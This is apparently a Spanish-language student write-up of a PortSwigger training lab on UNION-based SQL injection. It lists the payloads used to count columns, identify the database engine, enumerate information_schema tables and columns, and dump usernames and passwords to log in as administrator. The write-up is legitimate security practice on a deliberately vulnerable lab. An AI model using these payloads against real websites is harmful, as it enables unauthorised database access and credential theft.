[SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
Hacemos uso de la sentencia `ORDER BY 2` para el listado de las columnas

una vez sabemos el limite de las tablas, iniciamos con la identificacion del motor de la BD, ya en el enunciado dice que no es Oracle, por lo que tenemos 2 opciones para validar
Sentencia MySQL o Microsoft : `' union select @@version,null -- -`
Sentencia PostgreSQL              :`' union select version(),null -- -`
![[Pasted image 20260331172016.png]]

En el [CheatSheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet) localizamos la manera de hacer el llamado al listado de las tablas y columnas

Listado de tablas: ' union select table_name,null from information_schema.tables -- -
![[Pasted image 20260331172912.png]]

Localizamos la tabla 'USERS_LETRASALEATORIAS'
![[Pasted image 20260331172948.png]]

Ahora listamos las columnas `union select column_name,null from information_schema.columns where table_name='users_LETRASALEATORIAS'`
![[Pasted image 20260331173008.png]]

Por ultimo listamos los usuarios y contraseñas de la tabla users_letrasAleatorias
Sentencia: `union select username_letrasAleatorias,password_letrasAleatorias from users_letrasAleatorias`
![[Pasted image 20260331173252.png]]

E iniciamos sesion con los datos del administrador para lograr el laboratorio:
![[Pasted image 20260331173338.png]]
